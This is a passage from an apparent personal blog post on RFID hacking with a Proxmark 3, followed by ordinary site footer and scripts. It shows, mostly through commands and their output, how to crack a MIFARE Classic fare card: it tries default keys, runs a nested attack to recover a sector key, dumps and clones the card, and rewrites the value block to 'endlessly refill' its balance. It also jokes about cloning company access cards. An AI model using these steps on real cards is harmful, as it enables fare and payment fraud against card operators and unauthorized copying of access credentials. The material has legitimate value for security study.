+<span class="hljs-attribute">proprietary</span> non iso<span class="hljs-number">14443</span>-<span class="hljs-number">4</span> card found, RATS not supported
+<span class="hljs-attribute">Answers</span> to chinese magic backdoor commands: NO
+<span class="hljs-attribute">Valid</span> ISO<span class="hljs-number">14443</span>A Tag Found - Quitting Search
+</code></pre>
+<p>Unfortunately the MIFARE Card is not quite as easy to clone as a low frequency card. It leverages a simple authentication scheme which prevents us from just cloning the UID.</p>
+<p>While we can read certain blocks from the card others are unavailable because of an "Authentication Error":</p>
+<h6 id="successfulblockread">Successful Block Read:</h6>
+<pre><code class="hljs less"><span class="hljs-selector-tag">proxmark3</span>&gt; <span class="hljs-selector-tag">hf</span> <span class="hljs-selector-tag">mf</span> <span class="hljs-selector-tag">rdbl</span> <span class="hljs-selector-tag">0</span> <span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">FFFFFFFFFFFF</span>
+<span class="hljs-selector-tag">--block</span> <span class="hljs-selector-tag">no</span>:<span class="hljs-selector-tag">0</span>, <span class="hljs-selector-tag">key</span> <span class="hljs-selector-tag">type</span>:<span class="hljs-selector-tag">A</span>, <span class="hljs-selector-tag">key</span>:<span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">ff</span>            
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">READ</span> <span class="hljs-selector-tag">BLOCK</span> <span class="hljs-selector-tag">FINISHED</span>                 
+<span class="hljs-selector-tag">isOk</span>:<span class="hljs-selector-tag">01</span> <span class="hljs-selector-tag">data</span>:<span class="hljs-selector-tag">01</span> <span class="hljs-selector-tag">02</span> <span class="hljs-selector-tag">03</span> <span class="hljs-selector-tag">04</span> <span class="hljs-selector-tag">04</span> <span class="hljs-selector-tag">08</span> <span class="hljs-selector-tag">04</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span>  
+</code></pre>
+<h6 id="failedblockread">Failed Block Read:</h6>
+<pre><code class="hljs shell"><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> hf mf rdbl 5 A FFFFFFFFFFFF</span>
+--block no:5, key type:A, key:ff ff ff ff ff ff            
+<span class="hljs-meta">#</span><span class="bash">db<span class="hljs-comment"># Authentication failed. Card timeout.</span></span>                 
+<span class="hljs-meta">#</span><span class="bash">db<span class="hljs-comment"># Auth error</span></span>                 
+<span class="hljs-meta">#</span><span class="bash">db<span class="hljs-comment"># READ BLOCK FINISHED</span></span>                 
+isOk:00
+</code></pre>
+<p>At first it may seem odd that we can't read all blocks because we have a key but reading the <a href="https://en.wikipedia.org/wiki/MIFARE#MIFARE_Classic">Wikipedia article</a> clarifies everything for us:</p>
+<blockquote>
+<p>The MIFARE Classic 1K offers 1024 bytes of data storage, split into 16 sectors; each sector is protected by two different keys, called A and B. Each key can be programmed to allow operations such as reading, writing, increasing value blocks, etc.</p>
+</blockquote>
+<p>For some reason many MIFARE classic implementations use the default keys so there are a number of applications that test the default keys against a card.</p>
+<p>The PM3 features the "Test Block Keys" command which will test the default keys for us:</p>
+<pre><code class="hljs vbnet">proxmark3&gt; hf mf chk * ?
+No <span class="hljs-keyword">key</span> specified, trying <span class="hljs-keyword">default</span> keys
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">0</span>] ffffffffffff
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">1</span>] <span class="hljs-number">000000000000</span>
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">2</span>] a0a1a2a3a4a5
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">3</span>] b0b1b2b3b4b5
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">4</span>] aabbccddeeff
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">5</span>] <span class="hljs-number">4</span>d3a99c351dd
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">6</span>] <span class="hljs-number">1</span>a982c7e459a
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">7</span>] d3f7d3f7d3f7
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">8</span>] <span class="hljs-number">714</span>c5c886e97
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[ <span class="hljs-number">9</span>] <span class="hljs-number">587</span>ee5f9350f
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[<span class="hljs-number">10</span>] a0478cc39091
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[<span class="hljs-number">11</span>] <span class="hljs-number">533</span>cb6c723f6
+chk <span class="hljs-keyword">default</span> <span class="hljs-keyword">key</span>[<span class="hljs-number">12</span>] <span class="hljs-number">8</span>fd0a4f256e9
+--sector: <span class="hljs-number">0</span>, block:  <span class="hljs-number">3</span>, <span class="hljs-keyword">key</span> type:A, <span class="hljs-keyword">key</span> count:<span class="hljs-number">13</span>
+Found valid <span class="hljs-keyword">key</span>:[ffffffffffff]
+...omitted <span class="hljs-keyword">for</span> brevity...
+--sector:<span class="hljs-number">15</span>, block: <span class="hljs-number">63</span>, <span class="hljs-keyword">key</span> type:B, <span class="hljs-keyword">key</span> count:<span class="hljs-number">13</span>
+Found valid <span class="hljs-keyword">key</span>:[ffffffffffff]
+</code></pre>
+<p>Long story short it looks like we can use the default key of <code>ffffffffffff</code> to read most blocks but not some blocks.</p>
+<p>Using the "Nested Attack" we can  use our one useable key to identify keys for the other blocks.</p>
+<pre><code class="hljs markdown">proxmark3&gt; hf mf nested 1 0 A ffffffffffff   d
+Testing known keys. Sector count=16
+<span class="hljs-section">nested...
+-----------------------------------------------</span>
+uid:bc4ea535 trgbl=4 trgkey=0
+<span class="hljs-section">Found valid key:080808080808
+-----------------------------------------------</span>
+uid:bc4ea535 trgbl=8 trgkey=0
+Found valid key:080808080808
+<span class="hljs-section">Time in nested: 7.832 (3.916 sec per key)
+-----------------------------------------------</span>
+Iterations count: 2
+|---|----------------|---|----------------|---|
+|sec|key A           |res|key B           |res|
+|---|----------------|---|----------------|---|
+|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|001|  080808080808  | 1 |  ffffffffffff  | 1 |
+|002|  080808080808  | 1 |  ffffffffffff  | 1 |
+|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
+|---|----------------|---|----------------|---|
+Printing keys to binary file dumpkeys.bin...
+</code></pre>
+<p>I really have no idea how the Nested Attack works and there's not a bunch of information available online about it... <em>but it works</em>. If you want to learn more about the Nested Attack I would probably recommend reading the PM3 source code or some of the original papers detailing the attacks.</p>
+<h6 id="note">Note</h6>
+<p>In the earlier Nested Attack command it is important to dump the keys to the <code>dumpkeys.bin</code> file with the <code>d</code> parameter to enable the use of other MIFARE Classic commands.</p>
+<p>All of a sudden we have a new key: <code>080808080808</code>. This key allows us to read our secret blocks:</p>
+<pre><code class="hljs less"><span class="hljs-selector-tag">proxmark3</span>&gt; <span class="hljs-selector-tag">hf</span> <span class="hljs-selector-tag">mf</span> <span class="hljs-selector-tag">rdbl</span> <span class="hljs-selector-tag">5</span> <span class="hljs-selector-tag">A</span> <span class="hljs-selector-tag">080808080808</span>
+<span class="hljs-selector-tag">--block</span> <span class="hljs-selector-tag">no</span>:<span class="hljs-selector-tag">5</span>, <span class="hljs-selector-tag">key</span> <span class="hljs-selector-tag">type</span>:<span class="hljs-selector-tag">A</span>, <span class="hljs-selector-tag">key</span>:<span class="hljs-selector-tag">08</span> <span class="hljs-selector-tag">08</span> <span class="hljs-selector-tag">08</span> <span class="hljs-selector-tag">08</span> <span class="hljs-selector-tag">08</span> <span class="hljs-selector-tag">08</span>            
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">READ</span> <span class="hljs-selector-tag">BLOCK</span> <span class="hljs-selector-tag">FINISHED</span>                 
+<span class="hljs-selector-tag">isOk</span>:<span class="hljs-selector-tag">01</span> <span class="hljs-selector-tag">data</span>:<span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">0a</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">f5</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">ff</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">0a</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">00</span> <span class="hljs-selector-tag">05</span> <span class="hljs-selector-tag">fa</span> <span class="hljs-selector-tag">05</span> <span class="hljs-selector-tag">fa</span>
+</code></pre>
+<p>In addition with the <code>dumpkeys.bin</code> file ready we can dump the entire card and load it onto a blank MIFARE card.</p>
+<pre><code class="hljs lua">proxmark3&gt; hf mf <span class="hljs-built_in">dump</span> <span class="hljs-number">1</span>
+|<span class="hljs-comment">-----------------------------------------|</span>
+|<span class="hljs-comment">------ Reading sector access bits...-----|</span>
+|<span class="hljs-comment">-----------------------------------------|</span>
+#db# READ BLOCK FINISHED
+...omitted <span class="hljs-keyword">for</span> brevity...
+#db# READ BLOCK FINISHED
+|<span class="hljs-comment">-----------------------------------------|</span>
+|<span class="hljs-comment">----- Dumping all blocks to file... -----|</span>
+|<span class="hljs-comment">-----------------------------------------|</span>
+#db# READ BLOCK FINISHED
+Successfully <span class="hljs-built_in">read</span> block  <span class="hljs-number">0</span> of sector  <span class="hljs-number">0.</span>
+...omitted <span class="hljs-keyword">for</span> brevity...
+Successfully <span class="hljs-built_in">read</span> block  <span class="hljs-number">3</span> of sector <span class="hljs-number">15.</span>
+Dumped <span class="hljs-number">64</span> blocks (<span class="hljs-number">1024</span> bytes) to file dumpdata.bin
+</code></pre>
+<p>With the <code>dumpdata.bin</code> file we can restore this card's contents onto another card with: <code>hf mf restore 1</code>.</p>
+<p>However, cloning a MIFARE card is low on the totem pole. With the new keys we have the ability to read and write to the card. Considering it's commonly used as a fare card, it's reasonable to question whether or not the value of the card can be modified.</p>
+<p>To start let's look at a partial dump of the card:</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">bc4e</span> a<span class="hljs-number">535</span> <span class="hljs-number">6288</span> <span class="hljs-number">0400</span> <span class="hljs-number">8500</span> b<span class="hljs-number">42</span>e f<span class="hljs-number">0</span>bb <span class="hljs-number">6</span>aa<span class="hljs-number">8</span>
+<span class="hljs-attribute">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">ffff</span> ffff ffff ff<span class="hljs-number">07</span> <span class="hljs-number">8069</span> ffff ffff ffff
+<span class="hljs-attribute">4f54</span> <span class="hljs-number">4</span>f<span class="hljs-number">54</span> <span class="hljs-number">0050</span> <span class="hljs-number">0082</span> <span class="hljs-number">0136</span> <span class="hljs-number">000</span>b <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">4b07</span> <span class="hljs-number">0000</span> b<span class="hljs-number">4</span>f<span class="hljs-number">8</span> ffff <span class="hljs-number">4</span>b<span class="hljs-number">07</span> <span class="hljs-number">0000</span> <span class="hljs-number">05</span>fa <span class="hljs-number">05</span>fa
+<span class="hljs-attribute">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0101</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span>
+</code></pre>
+<p>Completely unintelligible until we use the card once and then dump the cards contents again:</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">bc4e</span> a<span class="hljs-number">535</span> <span class="hljs-number">6288</span> <span class="hljs-number">0400</span> <span class="hljs-number">8500</span> b<span class="hljs-number">42</span>e f<span class="hljs-number">0</span>bb <span class="hljs-number">6</span>aa<span class="hljs-number">8</span>
+<span class="hljs-attribute">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">ffff</span> ffff ffff ff<span class="hljs-number">07</span> <span class="hljs-number">8069</span> ffff ffff ffff
+<span class="hljs-attribute">4f54</span> <span class="hljs-number">4</span>f<span class="hljs-number">54</span> <span class="hljs-number">0050</span> <span class="hljs-number">0082</span> <span class="hljs-number">0136</span> <span class="hljs-number">000</span>b <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">3205</span> <span class="hljs-number">0000</span> cdfa ffff <span class="hljs-number">3205</span> <span class="hljs-number">0000</span> <span class="hljs-number">05</span>fa <span class="hljs-number">05</span>fa
+<span class="hljs-attribute">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0101</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span>
+</code></pre>
+<p>A single row in the dump has changed from:</p>
+<p><strong><code>4b07 0000 b4f8 ffff 4b07 0000 05fa 05fa</code></strong></p>
+<p>to</p>
+<p><strong><code>3205 0000 cdfa ffff 3205 0000 05fa 05fa</code></strong></p>
+<p>It's not immediately clear but there is definitely a changing value on the card. The simplest assumption to make is that the card is storing its own value and then decrementing the cost of a given transaction.</p>
+<p>Knowing our starting value (7.75), the cost of an item (2.25) and the resulting value (5.50) we can grep for these values in hex. To simplify our search we'll just take 75, convert it to hex (0x4b) and then search for the value in the first dump:</p>
+<p><strong>4b</strong>07 0000 b4f8 ffff <strong>4b</strong>07 0000 05fa 05fa</p>
+<p>This is a dead giveaway that the card is storing its own value. <em>Especially considering that the following byte is 0x07.</em> Therefore we should be able to increase the value of our card on our own by modifying these bytes.</p>
+<p>What's unclear is the meaning of the bytes after our stored value. They don't seem to repeat and they don't seem to be predictable given our two dumps. Being cautious, instead of just replacing our value with <code>ffff</code> it's simpler to fill up our card normally and then reuse that stored value.</p>
+<h6 id="note">Note</h6>
+<p>A friend pointed out that the <code>b4f8</code> value and the <code>4b07</code> value add up to <code>ffff</code> which pretty confidently say that it is a checksum value that the reader can use to verify that the card's value was successfully updated after a transaction. Thanks Soly!</p>
+<p>With our card filled up to 17.50 we can take a new dump and save the results of Block 5 (where the value is stored).</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">Block</span> <span class="hljs-number">0</span>: bc<span class="hljs-number">4</span>e a<span class="hljs-number">535</span> <span class="hljs-number">6288</span> <span class="hljs-number">0400</span> <span class="hljs-number">8500</span> b<span class="hljs-number">42</span>e f<span class="hljs-number">0</span>bb <span class="hljs-number">6</span>aa<span class="hljs-number">8</span>
+<span class="hljs-attribute">Block</span> <span class="hljs-number">1</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">Block</span> <span class="hljs-number">2</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">Block</span> <span class="hljs-number">3</span>: ffff ffff ffff ff<span class="hljs-number">07</span> <span class="hljs-number">8069</span> ffff ffff ffff
+<span class="hljs-attribute">Block</span> <span class="hljs-number">4</span>: <span class="hljs-number">4</span>f<span class="hljs-number">54</span> <span class="hljs-number">4</span>f<span class="hljs-number">54</span> <span class="hljs-number">0050</span> <span class="hljs-number">0082</span> <span class="hljs-number">0136</span> <span class="hljs-number">000</span>b <span class="hljs-number">0000</span> <span class="hljs-number">0000</span>
+<span class="hljs-attribute">Block</span> <span class="hljs-number">5</span>: <span class="hljs-number">3211</span> <span class="hljs-number">0000</span> cdee ffff <span class="hljs-number">3211</span> <span class="hljs-number">0000</span> <span class="hljs-number">05</span>fa <span class="hljs-number">05</span>fa
+<span class="hljs-attribute">Block</span> <span class="hljs-number">6</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0101</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span>
+</code></pre>
+<p>Now  we can endlessly refill our card to 17.50 as follows:</p>
+<h6 id="writeblock">Write Block</h6>
+<pre><code class="hljs bash">proxmark3&gt; hf mf wrbl 5 A 080808080808 32110000cdeeffff3211000005fa05fa
+--block no:5, key <span class="hljs-built_in">type</span>:A, key:08 08 08 08 08 08           
+--data: 32 11 00 00 <span class="hljs-built_in">cd</span> ee ff ff 32 11 00 00 05 fa 05 fa           
+<span class="hljs-comment">#db# WRITE BLOCK FINISHED                 </span>
+isOk:01
+</code></pre>
+<h6 id="readblock">Read Block</h6>
+<pre><code class="hljs bash">proxmark3&gt; hf mf rdbl 5 A 080808080808
+--block no:5, key <span class="hljs-built_in">type</span>:A, key:08 08 08 08 08 08            
+<span class="hljs-comment">#db# READ BLOCK FINISHED                 </span>
+isOk:01 data:32 11 00 00 <span class="hljs-built_in">cd</span> ee ff ff 32 11 00 00 05 fa 05 fa 
+</code></pre>
+<p>Even if the default keys weren't used, we could sniff the communication between the real reader and the card to ascertain a valid key.</p>
+<p>Ultimately as long as we know an existing key, we should be able to use the nested attack to identify other keys to gain read/write access to the card.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Many years of research have gone into the security of RFID card systems and the Proxmark 3 is the best tool for tapping into that wealth of knowledge and learning more about RFID card systems.</p>
+<p>I greatly recommend picking up a ProxMark 3 and some <a href="https://www.amazon.com/gp/product/B017IP85YW/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=B017IP85YW&amp;linkCode=as2&amp;tag=amzref0f-20&amp;linkId=dbfc33ecb4a5609e5e1624b27923dc6c">T5577</a> tags if you're interested in cloning your RFID cards and  learning more about how these systems work.</p>
+<p>It's also useful for converting your company's access control cards into little key fobs 💩</p>
+<!--kg-card-end: markdown-->
+    <div class="giscus"><iframe class="giscus-frame giscus-frame--loading" title="Comments" scrolling="no" allow="clipboard-write" src="https://giscus.app/en/widget?origin=https%3A%2F%2Fblog.kchung.co%2Frfid-hacking-with-the-proxmark-3%2F&amp;session=&amp;theme=preferred_color_scheme&amp;reactionsEnabled=1&amp;emitMetadata=0&amp;inputPosition=bottom&amp;repo=ColdHeat%2Fblog&amp;repoId=R_kgDOIuVCZg&amp;category=Announcements&amp;categoryId=DIC_kwDOIuVCZs4CTaml&amp;strict=0&amp;description=Radio-frequency+identification+%28RFID%29+is+a+widely+used+technology+for+the%0Atracking+and+identification+of+objects+that+have+been+%22tagged%22+with+small+RFID%0Atags.+These+tags+often+come+in+the+shape+of+little+keychains%2C+cards%2C+and%0Astickers.+They+can+be+seen+in+many+different+kind+of+systems+and+are+often%0Arelied&amp;backLink=https%3A%2F%2Fblog.kchung.co%2Frfid-hacking-with-the-proxmark-3%2F&amp;term=RFID+Hacking+with+The+Proxmark+3" loading="lazy" style="opacity: 0;"></iframe></div></section>
+
+
+</article>
+</main>
+
+    <section class="footer-cta outer">
+        <div class="inner">
+            <h2 class="footer-cta-title">Sign up for more like this.</h2>
+            <a class="footer-cta-button gh-portal-close" href="#/portal" data-portal="">
+                <div class="footer-cta-input">Enter your email</div>
+                <span>Subscribe</span>
+            </a>
+        </div>
+    </section>
+
+
+
+            <aside class="read-more-wrap outer">
+                <div class="read-more inner">
+                        
+<article class="post-card post featured">
+
+    <a class="post-card-image-link" href="/taking-over-a-dead-iot-company/">
+
+        <img class="post-card-image" srcset="/content/images/size/w300/2023/01/pikachu.png 300w,
+                    /content/images/size/w600/2023/01/pikachu.png 600w,
+                    /content/images/size/w1000/2023/01/pikachu.png 1000w,
+                    /content/images/size/w2000/2023/01/pikachu.png 2000w" sizes="(max-width: 1000px) 400px, 800px" src="/content/images/size/w600/2023/01/pikachu.png" alt="Taking over a Dead IoT Company" loading="lazy">
+
+
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/taking-over-a-dead-iot-company/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
+    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+</svg> Featured</span>
+                </div>
+                <h2 class="post-card-title">
+                    Taking over a Dead IoT Company
+                </h2>
+            </header>
+                <div class="post-card-excerpt">5 years after NYCTrainSign collapsed, I  investigate why the company failed and end up writing an exploit to take over their fleet.</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2023-01-09">Jan 9, 2023</time>
+                <span class="post-card-meta-length">15 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                        
+<article class="post-card post no-image">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/how-to-save-your-wordle-scores/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    How to Save Your Wordle Scores
+                </h2>
+            </header>
+                <div class="post-card-excerpt">This is a simple guide on copying your Wordle scores between devices.</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2022-02-09">Feb 9, 2022</time>
+                <span class="post-card-meta-length">3 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                        
+<article class="post-card post">
+
+    <a class="post-card-image-link" href="/pimp-my-walmart-pc/">
+
+        <img class="post-card-image" srcset="/content/images/size/w300/2021/07/full-pc-4.jpg 300w,
+                    /content/images/size/w600/2021/07/full-pc-4.jpg 600w,
+                    /content/images/size/w1000/2021/07/full-pc-4.jpg 1000w,
+                    /content/images/size/w2000/2021/07/full-pc-4.jpg 2000w" sizes="(max-width: 1000px) 400px, 800px" src="/content/images/size/w600/2021/07/full-pc-4.jpg" alt="Pimp My Walmart PC" loading="lazy">
+
+
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/pimp-my-walmart-pc/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    Pimp My Walmart PC
+                </h2>
+            </header>
+                <div class="post-card-excerpt">TL;DR Reverse engineering HP's proprietary PSU so that we can make a cheap
+gaming PC with parts from Walmart and an old GPU
+
+I'm no environmentalist but I don't really throw away working computer parts. I
+use them until they break beyond any sense of repairability. You can call</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2021-07-30">Jul 30, 2021</time>
+                <span class="post-card-meta-length">10 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                </div>
+            </aside>
+
+
+
+    </div>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="https://blog.kchung.co">Kevin Chung</a> © 2024</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous">
+</script>
+<script src="/assets/built/casper.js?v=189d2e264f"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.1/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+<script>
+    let ldData = JSON.parse(document.querySelector('script[type="application/ld+json"]').innerText);
+    if (ldData['@type'] === "Article") {
+        let giscus = document.createElement("div");
+        giscus.classList += "giscus"
+        document.querySelector(".gh-content").appendChild(giscus);
+        
+        // Dynamically load giscus
+        let giscusScript = document.createElement("script");
+        giscusScript.setAttribute("src", "https://giscus.app/client.js");
+        giscusScript.setAttribute("data-repo", "ColdHeat/blog");
+        giscusScript.setAttribute("data-repo-id", "R_kgDOIuVCZg");
+        giscusScript.setAttribute("data-category", "Announcements");
+        giscusScript.setAttribute("data-category-id", "DIC_kwDOIuVCZs4CTaml");
+        giscusScript.setAttribute("data-mapping", "title");
+        giscusScript.setAttribute("data-strict", "0");
+        giscusScript.setAttribute("data-reactions-enabled", "1");
+        giscusScript.setAttribute("data-emit-metadata", "0");
+        giscusScript.setAttribute("data-input-position", "bottom");
+        giscusScript.setAttribute("data-theme", "preferred_color_scheme");
+        giscusScript.setAttribute("data-lang", "en");
+        giscusScript.setAttribute("data-loading", "lazy")
+        giscusScript.setAttribute("crossorigin", "anonymous");
+        giscusScript.setAttribute("defer", "true");
+        document.body.appendChild(giscusScript);
+    }
+</script><script src="https://giscus.app/client.js" data-repo="ColdHeat/blog" data-repo-id="R_kgDOIuVCZg" data-category="Announcements" data-category-id="DIC_kwDOIuVCZs4CTaml" data-mapping="title" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="en" data-loading="lazy" crossorigin="anonymous" defer="true"></script>
+<script data-goatcounter="https://kchungco.goatcounter.com/count" async="" src="//gc.zgo.at/count.js"></script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-45573753-4', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<div id="ghost-portal-root"></div><div id="sodo-search-root"></div></body></html>
